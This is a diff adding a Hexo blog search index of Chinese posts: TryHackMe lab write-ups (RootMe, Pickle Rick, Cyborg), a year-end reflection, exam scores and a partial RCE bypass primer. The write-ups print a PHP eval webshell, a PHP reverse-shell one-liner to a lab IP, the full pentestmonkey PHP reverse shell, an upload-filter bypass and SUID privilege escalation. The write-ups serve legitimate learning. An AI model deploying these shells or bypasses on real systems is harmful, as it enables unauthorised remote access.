@@ -1,0 +1,191 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>THM3 Agent Sudo</title>
+      <link href="/2024/02/29/thm3/"/>
+      <url>/2024/02/29/thm3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Agent-Sudo"><a href="#Agent-Sudo" class="headerlink" title="Agent Sudo"></a>Agent Sudo</h1><blockquote><p>easy是你的谎言<br>还没玩明白,等学会了打完了再回来写</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> Try Hack Me </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> THM </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>THM2 RootMe</title>
+      <link href="/2024/02/21/thm2/"/>
+      <url>/2024/02/21/thm2/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>大晚上的，不知道干点啥，做个thm玩玩  </p></blockquote><span id="more"></span><ol><li><a href="#rootme">RootMe</a><ol><li><a href="#flag1">Flag1</a></li><li><a href="#flag2">Flag2</a><ol><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li><li><a href="#%E6%96%87%E7%AB%A0%E7%9A%84%E6%9C%80%E5%90%8E%E5%8F%91%E4%B8%80%E4%B8%8B%E6%88%91%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E7%9A%84php%E4%BB%A3%E7%A0%81">文章的最后发一下我使用的反弹shell的php代码</a></li></ol></li></ol></li></ol><h1 id="RootMe"><a href="#RootMe" class="headerlink" title="RootMe"></a>RootMe</h1><p>一打开题目，什么都没有，肯定还是老方法  </p><pre><code>nmap -sS -sV xx.xx.xx.xx --open  dirsearch -u xx.xx.xx.xx  </code></pre><p>经典操作扫<strong>端口</strong>和<strong>文件</strong>，发现一个 <em>&#x2F;uploads</em> 路径和一个不知道啥的 <em>&#x2F;panel</em> 路径,那必须访问上去看看啊  </p><p><img src="/images/zhaopian/thm-rootme/dir.png" alt="dir">  </p><p>原来uploads里装的应该是咱传上去的东西,panel才是上传接口  </p><p><img src="/images/zhaopian/thm-rootme/panel.png" alt="panel">  </p><p><img src="/images/zhaopian/thm-rootme/uploads.png" alt="uploads">  </p><p>看了一眼是php,直接传个小马先  </p><p><img src="/images/zhaopian/thm-rootme/php.png" alt="php">  </p><pre><code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code></pre><p>上面带waf的，各种方法都绕不过去，搜了一下发现apache会从右往左解析，遇到解析不了的会跳过去，这样我们上传一个<em><strong>shell.php.zzz</strong></em>就可以成功绕过<br><img src="/images/zhaopian/thm-rootme/waf1.png" alt="waf1"><br><img src="/images/zhaopian/thm-rootme/ok.png" alt="ok">  </p><p>直接蚁剑连上<br><img src="/images/zhaopian/thm-rootme/ok2.png" alt="ok2">   </p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>翻到 <em><strong>www</strong></em> 目录直接就发现了第一个 <strong>flag</strong><br><img src="/images/zhaopian/thm-rootme/flag1.png" alt="flag1"><br><img src="/images/zhaopian/thm-rootme/1.png" alt="1"><br>THM{y0u_g0t_a_sh3ll}</p><p>到这里其实都没有什么难度，第二个flag才算是学到了新的知识</p><h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>根据题目要去 <em>&#x2F;root</em> 下找第二个flag，直接往前翻，但是因为没有权限所以没成功  </p><p><img src="/images/zhaopian/thm-rootme/quan.png" alt="quan"><br>弹个shell准备提权，这里使用<code>find -perm -4000</code>搜索带有suid权限的命令，看到有个python,使用现学来的suid提权方法提权  </p><blockquote><p>本来我是不会提权的，练这一道题正好入门了，这里是经过大佬的博客学会了使用find命令来搜suid命令  </p></blockquote><p>大佬的博客<a href="https://blog.51cto.com/yttitan/6046179">https://blog.51cto.com/yttitan/6046179</a>  </p><p>这里是引用大佬的话</p><pre><code>已知的可以被用来进行SUID提权的程序主要有：nmap、vim、find、bash、more、less、nano、cp等，所以我们可以重点去查看一下这些程序是否被设置了SUID权限。但是挨个去查看的话，效率太低，所以这里推荐采用搜索的方式去查找系统中所有设置了SUID的程序。搜索肯定要用到find命令，这是Linux中的一个比较复杂的命令，当然功能也非常强大。find命令之所以复杂，原因之一就是拥有众多选项。我们这里按文件权限查找，需要用到它的-perm选项。-perm选项的基本用法很简单，格式为&quot;-perm mode”，其中mode为所要匹配的权限。我们通常见到的权限数字组合都是类似于755或644这种形式，其实完整的权限数字组合应该是四位数，左侧最高位就是用于表示特殊权限。只不过特殊权限并不常用，所以我们平常见到的才主要是三位数字组合。我们现在要查找的是SUID这种特殊权限，所以要使用的必然是四位数字组合。SUID对应的权限数字是4，特殊权限被放在数字组合左侧最高位，所以mode通常用4000表示。注意，数字0表示忽略相应位置的权限，也就是说不考虑rwx权限，所以4000就表示查找被设置了SUID权限的文件，至于其它的rwx权限则根本不考虑。执行&quot;find／-perm-4000&quot;就可以查找出系统中所有被设置了SUID权限的文件。下面所使用的命令中2&gt;/dev/null，表示屏蔽错误信息。因为find命令在执行过程中可能会出现一些错误信息，加上这个功能可以让显示结果更加清晰。</code></pre><p><img src="/images/zhaopian/thm-rootme/suid.png" alt="suid">  </p><p>这里没发现那几个常用的suid提权程序,但是有个python,于是可以使用python提权,看了好多wp发现都是下面这个网站里找到提权程序的<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><blockquote><p>这中间其实发生了不少事，我折腾了半个小时，包括nc监听不了端口，明明续命了仍然断了被迫换靶机，蚁剑反弹shell就是不好使，换php代码找了个自动反弹shell的弹上去最后提权成功，虽然很费劲，但还是成功拿下第三道  </p></blockquote><p><img src="/images/zhaopian/thm-rootme/root.png" alt="root">  </p><p><img src="/images/zhaopian/thm-rootme/flag2.png" alt="flag2">  </p><p>THM{pr1v1l3g3_3sc4l4t10n}</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这个靶机中,可以学习到使用find命令查找suid权限,学会了最基本的suid提权方法,收获了一个反弹shell的轮子</p><h3 id="文章的最后发一下我使用的反弹shell的php代码"><a href="#文章的最后发一下我使用的反弹shell的php代码" class="headerlink" title="文章的最后发一下我使用的反弹shell的php代码"></a>文章的最后发一下我使用的反弹shell的php代码</h3><pre><code>&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  The author accepts no liability// for damage caused by this tool.  If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#39;10.8.39.215&#39;;  // CHANGE THIS$port = 9999;       // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try...if (function_exists(&#39;pcntl_fork&#39;)) &#123;    // Fork and have the parent process exit    $pid = pcntl_fork();        if ($pid == -1) &#123;        printit(&quot;ERROR: Can&#39;t fork&quot;);        exit(1);    &#125;        if ($pid) &#123;        exit(0);  // Parent exits    &#125;    // Make the current process a session leader    // Will only succeed if we forked    if (posix_setsid() == -1) &#123;        printit(&quot;Error: Can&#39;t setsid()&quot;);        exit(1);    &#125;    $daemon = 1;&#125; else &#123;    printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);&#125;// Change to a safe directorychdir(&quot;/&quot;);// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) &#123;    printit(&quot;$errstr ($errno)&quot;);    exit(1);&#125;// Spawn shell process$descriptorspec = array(   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) &#123;    printit(&quot;ERROR: Can&#39;t spawn shell&quot;);    exit(1);&#125;// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);while (1) &#123;    // Check for end of TCP connection    if (feof($sock)) &#123;        printit(&quot;ERROR: Shell connection terminated&quot;);        break;    &#125;    // Check for end of STDOUT    if (feof($pipes[1])) &#123;        printit(&quot;ERROR: Shell process terminated&quot;);        break;    &#125;    // Wait until a command is end down $sock, or some    // command output is available on STDOUT or STDERR    $read_a = array($sock, $pipes[1], $pipes[2]);    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);    // If we can read from the TCP socket, send    // data to process&#39;s STDIN    if (in_array($sock, $read_a)) &#123;        if ($debug) printit(&quot;SOCK READ&quot;);        $input = fread($sock, $chunk_size);        if ($debug) printit(&quot;SOCK: $input&quot;);        fwrite($pipes[0], $input);    &#125;    // If we can read from the process&#39;s STDOUT    // send data down tcp connection    if (in_array($pipes[1], $read_a)) &#123;        if ($debug) printit(&quot;STDOUT READ&quot;);        $input = fread($pipes[1], $chunk_size);        if ($debug) printit(&quot;STDOUT: $input&quot;);        fwrite($sock, $input);    &#125;    // If we can read from the process&#39;s STDERR    // send data down tcp connection    if (in_array($pipes[2], $read_a)) &#123;        if ($debug) printit(&quot;STDERR READ&quot;);        $input = fread($pipes[2], $chunk_size);        if ($debug) printit(&quot;STDERR: $input&quot;);        fwrite($sock, $input);    &#125;&#125;fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we&#39;ve daemonised ourself// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)function printit ($string) &#123;    if (!$daemon) &#123;        print &quot;$string\n&quot;;    &#125;&#125;?&gt; </code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Try Hack Me </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> THM </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>THM 两个简单靶场记录</title>
+      <link href="/2024/02/19/thm/"/>
+      <url>/2024/02/19/thm/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>记录下try hack me的学习之路</p></blockquote><span id="more"></span><p>[TOC]</p><ol><li><a href="#pickle-rick">Pickle Rick</a><ol><li><a href="#flag1">flag1</a></li><li><a href="#flag2">flag2</a></li><li><a href="#flag3">flag3</a></li></ol></li><li><a href="#cyborg">Cyborg</a><ol><li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li><li><a href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">暴力破解</a></li><li><a href="#flag1-1">flag1</a></li><li><a href="#flag2-1">flag2</a></li></ol></li></ol><h1 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h1><p><img src="/images/zhaopian/thm-pickle/pickle1.png" alt="题目">  </p><p>需要寻找三部分flag</p><hr><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>首先打开题目,什么也没有,按F12看到用户名<br><img src="/images/zhaopian/thm-pickle/pickle2.png" alt="1">  </p><p>然后信息收集:</p><ol><li>nmap扫描发现只开了两个端口:22,80</li><li>dirsearch扫描发现可疑文件<br><img src="/images/zhaopian/thm-pickle/pickle3.png" alt="2"></li></ol><p>访问robots.txt 看到一串字符串: <strong>Wubbalubbadubdub</strong>，猜测是密码<br>访问login.php 使用用户名和密码登录<br><img src="/images/zhaopian/thm-pickle/pickle4.png" alt="3">  </p><p>是一个命令执行窗口，输入<strong>ls</strong>看看<br><img src="/images/zhaopian/thm-pickle/pickle5.png" alt="4">  </p><p><strong>cat</strong>一下第一个txt文件发现被过滤，使用经典的绕过：<strong>tac</strong><br><img src="/images/zhaopian/thm-pickle/pickle6.png" alt="5"><br><img src="/images/zhaopian/thm-pickle/pickle7.png" alt="6"><br>得到第一个flag：<strong>mr. meeseek hair</strong>  </p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>接着tac其他文件发现并无关键信息<br>clue.txt 内容：<strong>Look around the file system for the other ingredient.</strong><br>defined.php为：<img src="/images/zhaopian/thm-pickle/pickle8.png" alt="7"><br>显然，权限不够<br>于是思考反弹shell到攻击机，使用php语言<br><code>php -r &#39;$sock=fsockopen(&quot;10.8.39.215&quot;,9999);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</code><br><img src="/images/zhaopian/thm-pickle/pickleshell.png" alt="shell"><br>反弹成功，并发现可以直接使用sudo su 变成root权限<br>然后就是随心所欲了，cd &#x2F;home发现rick，进一步拿到第二个flag: <strong>1 jerry tear</strong><br><img src="/images/zhaopian/thm-pickle/pickleshell2.png" alt="shell2">  </p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>根据直接提权到root猜测最后一个flag在root目录下（让我们一开始不是root的时候访问不了）<br><img src="/images/zhaopian/thm-pickle/pickleshell3.png" alt="shell3"><br>拿到最后一个flag：<strong>fleeb juice</strong></p><pre><code>总结：这个还是很好玩的，体会到一步步寻找的乐趣，而且也非常简单，适合初学者熟悉大致流程。</code></pre><hr><h1 id="Cyborg"><a href="#Cyborg" class="headerlink" title="Cyborg"></a>Cyborg</h1><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先用nmap扫描开放端口信息，枚举端口上运行的服务</p><p><img src="/images/zhaopian/thm-cyborg/99409.png"></p><p>访问80端口是个apache默认页面，用dirb扫描一下网站目录</p><p>发现两个比较可疑的目录&#x2F;admin和&#x2F;etc</p><p><img src="/images/zhaopian/thm-cyborg/67673.png"></p><p>再用dirbuster扫一遍目录，得到一个压缩包archive.tar，我以为是源码之类的，打开发现不是。</p><p><img src="/images/zhaopian/thm-cyborg/39391.png"></p><p>现招其它线索，admin.html里有些聊天记录，这里有几个民资Josh、adam、alex</p><p>还有一个被描述的很重要的东西叫music_archive</p><p><img src="/images/zhaopian/thm-cyborg/60558.png"></p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>随后在&#x2F;etc目录下发现了这个东西，看起来像是一串密文，特征还比较明显</p><p><img src="/images/zhaopian/thm-cyborg/26075.png"></p><p>打开hashcat的密文类型进行匹配，匹配到1600 $apr1$</p><p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p><p><img src="/images/zhaopian/thm-cyborg/89430.png"></p><p>用hashcat暴力破解</p><p><img src="/images/zhaopian/thm-cyborg/02891.png"></p><p>暴力匹配rockyou得到明文，用这个密码ssh试了所有得到的类似用户的账号都没有进去。</p><p><img src="/images/zhaopian/thm-cyborg/25450.png"></p><p>再回到之前的tar文件，里面有个README，里面指向一个域名</p><p><img src="/images/zhaopian/thm-cyborg/27379.png"></p><p>访问一下，理解大概是一个文件储存仓库的东西</p><p><img src="/images/zhaopian/thm-cyborg/20937.png"></p><p>再github上也找到了相关的项目，这里有个安装包，我们下载来看看</p><p><img src="/images/zhaopian/thm-cyborg/74815.png"></p><p>运行borg就会出现帮助文档</p><p><img src="/images/zhaopian/thm-cyborg/60113.png"></p><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>根据文档用list 查看目录下的文件，密码用刚刚破解得到的hash，有个music_archive</p><p>用extract提取出来，密码一样。得到一个alex的文件</p><p><img src="/images/zhaopian/thm-cyborg/08924.png"></p><p>看下alex的目录结构类似于“home”目录</p><p><img src="/images/zhaopian/thm-cyborg/94613.png"></p><p>翻了目录得到alex的账号和密码</p><p><img src="/images/zhaopian/thm-cyborg/82615.png"></p><p>ssh上去直接拿到第一个flag  </p><p><img src="/images/zhaopian/thm-cyborg/12345.png" alt="flag1"></p><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>使用sudo -l查看具有sudo权限的命令，有个&#x2F;etc&#x2F;mp3backups&#x2F;backup.sh</p><p>查看文件所有者是alex，加个可写权限</p><p><img src="/images/zhaopian/thm-cyborg/56804.png"></p><p>在文件中加入反弹shell命令</p><p><img src="/images/zhaopian/thm-cyborg/60495.png" alt="shell"></p><p>攻击机上起监听，没一会shell 就过来了</p><p>登录后crontab -l看下定时任务，</p><p>发现backup.sh在定时任务中</p><p>成功拿到root</p><p><img src="/images/zhaopian/thm-cyborg/44276.png"></p><p>flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Try Hack Me </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> THM </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>致2023</title>
+      <link href="/2023/12/31/2023/"/>
+      <url>/2023/12/31/2023/</url>
+      
+        <content type="html"><![CDATA[<h1 id="2023年度总结"><a href="#2023年度总结" class="headerlink" title="2023年度总结"></a>2023年度总结</h1><span id="more"></span><p>[TOC]</p><ol><li><a href="#2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93">2023年度总结</a><ol><li><a href="#%E5%9B%9E%E9%A6%962023%E6%88%91%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E4%BA%8B">回首2023，我做了哪些事</a></li><li><a href="#%E5%AF%B9%E6%9C%AA%E6%9D%A5%E7%9A%84%E8%A7%84%E5%88%92">对未来的规划</a><ol><li><a href="#%E4%B8%8A%E5%8D%8A%E5%B9%B4">上半年</a></li><li><a href="#%E4%B8%8B%E5%8D%8A%E5%B9%B4">下半年</a></li></ol></li><li><a href="#%E5%BC%95%E7%94%A8%E4%B8%80%E6%AE%B5fushuling%E5%A4%A7%E4%BD%AC%E7%9A%84blog%E9%87%8C%E7%9A%84%E8%AF%9D">引用一段fushuling大佬的blog里的话</a></li></ol></li><li><a href="#%E6%9C%80%E5%90%8E%E7%A5%9D%E5%90%84%E4%BD%8D%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90">最后，祝各位新年快乐！</a></li></ol><h3 id="回首2023，我做了哪些事"><a href="#回首2023，我做了哪些事" class="headerlink" title="回首2023，我做了哪些事"></a>回首2023，我做了哪些事</h3><ol><li>六月成功利用xray挖到了第一个src重复漏洞  </li><li>搞了个博客，还不怎么更新</li><li>没了</li><li>总结，我就是个废物</li></ol><hr><h3 id="对未来的规划"><a href="#对未来的规划" class="headerlink" title="对未来的规划"></a>对未来的规划</h3><p>2024年，是高二下半年与高三上半年，在2024年9月1日那天，我们就将正式步入高三生活</p><h4 id="上半年"><a href="#上半年" class="headerlink" title="上半年"></a>上半年</h4><ol><li>先过学考</li><li>备考期末，主抓语数地（ 你个傻逼学校不给我整日语卷纸我考你妈啊）</li><li>又将是一个三周的寒假，学习，复习，打ctf，挖src</li><li>开学后：高二下半年了，请不要过的浑浑噩噩</li></ol><h4 id="下半年"><a href="#下半年" class="headerlink" title="下半年"></a>下半年</h4><ol><li>全身心的备战2025年的高考</li></ol><hr><h3 id="引用一段fushuling大佬的blog里的话"><a href="#引用一段fushuling大佬的blog里的话" class="headerlink" title="引用一段fushuling大佬的blog里的话"></a>引用一段fushuling大佬的blog里的话</h3><p>感觉又看到了很多需要去学习的  </p><blockquote><p>看别人的简历，大部分人简历中对某个技能的掌握程度都大概分为三种——了解、熟悉和精通，按照这个标准，我也把对某项技能的掌握程度分为了三个程度——入门、熟练和精通，入门也就是大致了解某种技巧的常见利用方法，对原理有着基础的认识，比如sql注入的盲注知道个时间盲注和布尔盲注，知道时间盲注可以用sleep()构造延时来判断自己的语句是否正确执行，这大概就算基本入门了；而做到熟练的话，至少得掌握大部分常见的利用方法，对原理有本质的认识，还是以时间盲注为例，得知道各种限制条件下如何进行时间盲注，比如知道如果注入的时候sleep语句被ban了，明白时间盲注的本质就是要构造延时来判断自己的语句是否成功执行，因此即使sleep被ban了，也可以通过其他方法构造延时，比如可以用benchmark重复执行某个表达式构造延时、通过rpad或repeat构造长字符串加以计算量大的pattern来制造延时、用笛卡尔积连接表进行延时或者简单点只是执行某个非常麻烦的句子，比如把某个字符串hex很多遍然后select它的长度来明显减缓数据库的执行速度构造延迟等等，如果发现关键字被过滤可以想到其他绕过方法比如16进制之类的，发现执行的sql语句知道一些绕简单waf的方法比如分块传输、参数污染等。至于精通，虽然我自己也没达到这个水平，但我自己对这个境界的理解是，要对原理有着深刻的认识，能在前人的基础上做到推陈出新，对一些问题能提出自己独到的见解，提出一些崭新的方法，比如p神提出的那么多全新的技巧。<br>今年个人认为写的最好的应该是无字母数字RCE和wakeup绕过这俩篇，达到了熟练这个程度，不过从结果上看，还是那篇sql注入总结受欢迎程度高点。就mysql注入而言的话勉强达到了熟练这个程度，但那篇文章既然叫sql注入，还是很多其他数据库的注入没有提到，比如oracle啥的，有点名不副实，奈何我自己也不会，也没法写，而且连现在业界最常见的预编译下的sql注入都没提到，可谓极大的失败，还好后来补了一篇专门研究预编译的文章。wakeup绕过这篇写的确实是比较全，至少我当时写的时候网上大部分文章都没提到我博客里写的那几种技巧，后来看别人博客有时候总会看到别人引用我的博客链接，不经令人感叹。</p></blockquote><p>从中总结,需要学习的有sql注入各语句及sql特性,RCE(我的RCE全解还没写完QAQ),反序列化绕过(记得有一次哪个比赛出的就是wakeup绕过,虽然被非预期了),oracle注入,预编译注入(贴个大佬blog供自己学习)<br><a href="https://fushuling.com/index.php/2023/10/27/%e9%a2%84%e7%bc%96%e8%af%91%e4%b8%8esql%e6%b3%a8%e5%85%a5/">预编译与sql注入</a>  </p><h1 id="最后，祝各位新年快乐！"><a href="#最后，祝各位新年快乐！" class="headerlink" title="最后，祝各位新年快乐！"></a>最后，祝各位新年快乐！</h1>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 年度总结 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>成绩</title>
+      <link href="/2023/11/17/%E8%80%83%E8%AF%95/"/>
+      <url>/2023/11/17/%E8%80%83%E8%AF%95/</url>
+      
+        <content type="html"><![CDATA[<h4 id="一个专门用来记录考试成绩的帖子（更新于2024年1月15日）"><a href="#一个专门用来记录考试成绩的帖子（更新于2024年1月15日）" class="headerlink" title="一个专门用来记录考试成绩的帖子（更新于2024年1月15日）"></a>一个专门用来记录考试成绩的帖子（更新于2024年1月15日）</h4><span id="more"></span><p><img src="/images/zhaopian/1.png" alt="高二上期中"></p><blockquote><p>别问英语怎么回事,我学日语的,英语前卷满分110我扣64,大作文25分没写,乐,学nm英语</p></blockquote><p>记录下2025届傻逼在高二上的期中考试考出来的傻逼成绩，我一开始满心欢喜捏，考试过程中答的挺开心，结果数学错一堆，语文也莫名奇妙，鬼作文好像还跑题了，地理大题约等于0分，前面选择错一半（应该没有比我多的了），化学60，物理70（这俩我感觉还行结果怎么才中档，还是傻逼，还得努力），甚至盼望出分</p><p>高二期中考试总成绩（大榜449）：语文72，数学49，英语56，物理55，化学51（78），地理36（70）</p><h4 id="以后这个文件就用来更新成绩，从高二上的这个期中考试开始"><a href="#以后这个文件就用来更新成绩，从高二上的这个期中考试开始" class="headerlink" title="以后这个文件就用来更新成绩，从高二上的这个期中考试开始"></a>以后这个文件就用来更新成绩，从高二上的这个期中考试开始</h4><hr><h2 id="2024年1月15日更新"><a href="#2024年1月15日更新" class="headerlink" title="2024年1月15日更新"></a>2024年1月15日更新</h2><p><img src="/images/zhaopian/2.png" alt="高二上期末"><br><img src="/images/zhaopian/%E7%89%A9%E7%90%86.png" alt="物理单科"><br><img src="/images/zhaopian/%E5%8C%96%E5%AD%A6.png" alt="化学单科"></p><blockquote><p>虽然进步了，但是不是很满意，物理后面大题明明很简单却完全没拿到分（得有23分），化学选择15错8，大题也很少拿分，地理选择16对5，一下就33分没了</p></blockquote><p>高二上期末考试总成绩（大榜361）：语文76.5，数学82, 英语85.5, 物理62, 化学43 (69) , 地理38 (74)</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>RCE全解</title>
+      <link href="/2023/10/26/rce/"/>
+      <url>/2023/10/26/rce/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><ol><li><a href="#%E4%B8%80rce%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0">一、RCE漏洞概述</a></li><li><a href="#%E4%BA%8C%E5%B8%B8%E8%A7%81rce%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0">二、常见RCE漏洞函数</a><ol><li><a href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0">系统命令执行函数</a></li><li><a href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0">代码执行函数</a></li></ol></li><li><a href="#%E4%B8%89%E7%BB%95%E8%BF%87">三.绕过</a><ol><li><a href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4">空格过滤:</a></li><li><a href="#%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4">函数过滤:</a></li><li><a href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">黑名单绕过:</a></li></ol></li></ol><span id="more"></span><h3 id="这是一篇关于RCE的全解文章"><a href="#这是一篇关于RCE的全解文章" class="headerlink" title="这是一篇关于RCE的全解文章"></a>这是一篇关于RCE的全解文章</h3><h2 id="一、RCE漏洞概述"><a href="#一、RCE漏洞概述" class="headerlink" title="一、RCE漏洞概述"></a>一、RCE漏洞概述</h2><blockquote><p>在Web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞；</p></blockquote><h2 id="二、常见RCE漏洞函数"><a href="#二、常见RCE漏洞函数" class="headerlink" title="二、常见RCE漏洞函数"></a>二、常见RCE漏洞函数</h2><h3 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h3><pre><code class="php">system()：能将字符串作为OS命令执行，且返回命令执行结果；  exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；  shell_exec()：能将字符串作为OS命令执行  passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；  popen()：打开进程文件指针  proc_open()：与popen()类似  pcntl_exec()：在当前进程空间执行指定程序；  反引号``：反引号``内的字符串会被解析为OS命令  </code></pre><h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><pre><code class="php">eval()：将字符串作为php代码执行；  assert()：将字符串作为php代码执行；  preg_replace()：正则匹配替换字符串；  create_function()：主要创建匿名函数；  call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；  call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；  可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；  </code></pre><hr><h2 id="三-绕过"><a href="#三-绕过" class="headerlink" title="三.绕过"></a>三.绕过</h2><h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤:"></a>空格过滤:</h4><table><thead><tr><th align="center">&lt;</th><th align="center">&lt;&gt;</th><th align="center">%09</th><th align="center">%0a</th></tr></thead><tbody><tr><td align="center">$IFS$9</td><td align="center">${IFS}</td><td align="center">$IFS</td><td align="center"></td></tr></tbody></table><h4 id="函数过滤"><a href="#函数过滤" class="headerlink" title="函数过滤:"></a>函数过滤:</h4><pre><code>使用\绕过 如:ca\t fla\gl\s使用&#39;&#39;绕过,如:ca&#39;&#39;t /flag</code></pre><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过:"></a>黑名单绕过:</h4><pre><code class="php">var_dump()输出变量file_get_contents() 读文件get_defined_vars() 读变量next() 对数组操作array_pop() 弹出数组rename() 